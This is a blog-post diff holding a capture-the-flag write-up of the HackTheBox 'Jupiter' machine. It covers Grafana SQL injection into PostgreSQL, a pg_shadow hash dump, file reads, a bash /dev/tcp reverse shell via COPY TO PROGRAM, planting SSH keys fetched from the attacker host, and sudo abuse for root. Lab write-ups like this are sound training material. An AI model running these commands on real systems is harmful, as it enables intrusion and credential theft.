@@ -1,0 +1,248 @@
+---
+layout: post
+title:  "Writeup of Jupiter (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox jupiter grafana postgresql
+---
+
+# Discovery
+Nothing interesting on **jupiter.htb** (scan in `buster.out`).
+
+There is another subdomain: **kiosk.jupiter.htb**.
+
+# Grafana
+
+**kiosk.jupiter.htb** runs `Grafana v9.5.2 (cfcea75916)` and some app.
+
+# Sql injection
+
+There is an SQL injection in:
+
+`POST /api/ds/query HTTP/1.1`
+
+```json
+{
+  "queries": [
+    {
+      "refId": "A",
+      "datasource": {
+        "type": "postgres",
+        "uid": "YItSLg-Vz"
+      },
+      "rawSql":"select name, parent, meaning from moons;",
+      "format": "table",
+      "datasourceId": 1,
+      "intervalMs": 60000,
+      "maxDataPoints": 940
+    }
+  ],
+  ...
+}
+```
+
+**[It's postgresql.](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)**
+
+`SELECT version()`
+
+```
+PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, 64-bit
+```
+
+`SELECT current_setting('is_superuser');`
+
+```
+"on"
+```
+
+**We are a superuser!**
+
+`SELECT table_schema,table_name FROM information_schema.tables;`
+
+```
+pg_user
+pg_shadow
+pg_auth_members
+...
+```
+
+`SELECT * from pg_shadow;`
+
+```
+usename: grafana_viewer
+usesysid: 16385
+passwd: SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=
+```
+
+`.\hashcat.exe -m 28600 .\hash.txt --wordlist .\rockyou.txt` - exhausted
+
+`.\hashcat.exe -m 28600 .\hash.txt --wordlist .\xato-net-10-million-passwords-1000000.txt` - exhausted
+
+# File read/write
+We can list directories using:
+
+`select pg_ls_dir('./');`
+
+And read files using:
+
+`select pg_read_file('file', 0, 200);`
+
+- /etc/passwd
+
+```
+root:x:0:0:root:/root:/bin/bash
+...
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+grafana:x:115:121::/usr/share/grafana:/bin/false
+...
+juno:x:1000:1000:juno:/home/juno:/bin/bash
+jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
+```
+
+**Binary/long file read:**
+
+`select encode(pg_read_binary_file('file'), 'base64'); `
+
+**File write:**
+
+`COPY (SELECT 'test') TO '/tmp/file';`
+
+# Shell as postgres
+
+`copy (SELECT '') to program 'bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"';`
+
+Script **injection.py** automates it:
+
+`python3 injection.py shell 10.10.14.144 9001`
+
+**Interesting directory:** `/usr/share/grafana`
+
+# Enumeration
+
+**Files owned by juno:**
+
+```
+/dev/shm/shadow.data
+/dev/shm/shadow.data/sim-stats.json
+/dev/shm/shadow.data/hosts
+/dev/shm/shadow.data/hosts/server
+/dev/shm/shadow.data/*
+/dev/shm/network-simulation.yml
+/home/juno
+/run/user/1000
+/var/crash/_usr_bin_bash.1000.crash
+```
+
+# Shell as juno
+
+First `cd /dev/shm/b0 && wget http://10.10.14.144:8000/authorized_keys && chmod 777 . && chmod 777 authorized_keys`
+
+Then run a few second before a full minute:
+
+`curl http://10.10.14.144:8000/network-simulation.yml > /dev/shm/network-simulation.yml`
+
+```
+- path: /usr/bin/touch
+      args: /dev/shm/b0/DONE4
+      start_time: 1s
+- path: /usr/bin/cp
+      args: /dev/shm/b0/authorized_keys /home/juno/.ssh/authorized_keys
+      start_time: 3s
+```
+
+**SSH:** `ssh -i id_rsa juno@10.10.11.216`
+
+`user.txt: <redacted>`
+
+# Trying to hop to jovian
+
+`uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)`
+
+`find / -group science 2>/dev/null`
+
+```
+/opt/solar-flares
+/opt/solar-flares/flares.csv
+/opt/solar-flares/xflares.csv
+/opt/solar-flares/map.jpg
+/opt/solar-flares/start.sh
+/opt/solar-flares/logs
+/opt/solar-flares/logs/*
+/opt/solar-flares/flares.html
+/opt/solar-flares/cflares.csv
+/opt/solar-flares/flares.ipynb
+/opt/solar-flares/.ipynb_checkpoints
+/opt/solar-flares/mflares.csv
+```
+
+# Jupyter on :8888
+
+`./chisel server -p 1337 --reverse`
+
+`./chisel client 10.10.14.144:1337 R:8888:127.0.0.1:8888/tcp`
+
+```json 
+"notebook_version": "6.5.3"
+```
+
+**There is a token in** `/opt/solar-flares/logs/jupyter-2023-06-10-55.log`:
+
+```
+http://localhost:8888/?token=25a28dce6d4b11b008f473b34c88f40bdd05a7cc546dabe2
+```
+
+**We can log in and get a SUID bash / reverse shell.**
+
+Setting UID for SUID bash:
+
+`python3 -c 'import os; os.setreuid(1001,1001); os.setregid(1002,1002); os.system("/bin/bash")'`
+
+# Escaping jovian
+
+`sudo -l`
+
+```
+Matching Defaults entries for jovian on jupiter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jovian may run the following commands on jupiter:
+    (ALL) NOPASSWD: /usr/local/bin/sattrack
+```
+
+`find / 2>/dev/null | grep -i sattrack`
+
+```
+/usr/local/share/sattrack
+/usr/local/share/sattrack/config.json
+/usr/local/share/sattrack/map.json
+/usr/local/share/sattrack/earth.png
+/usr/local/bin/sattrack
+```
+
+After decompilation using Ghidra, it's apparent that **sattrack** looks for a hardcoded file:
+
+```c
+local_2a8[0] = "/tmp/config.json";
+```
+
+**We can upload authorized_keys to gain SSH access:**
+
+```
+"tleroot": "/root/.ssh/",
+"tlefile": "weather.txt",
+"mapfile": "/usr/local/share/sattrack/map.json",
+"texturefile": "/usr/local/share/sattrack/earth.png",
+
+"tlesources": [
+        "http://10.10.14.144:8000/weather.txt",
+        "http://10.10.14.144:8000/noaa.txt",
+        "http://10.10.14.144:8000/authorized_keys"
+],
+```
+
+**Then:** `sudo /usr/local/bin/sattrack`
+
+**And:** `ssh root@10.10.11.216 -i id_rsa`
+
+`root.txt: <redacted>`
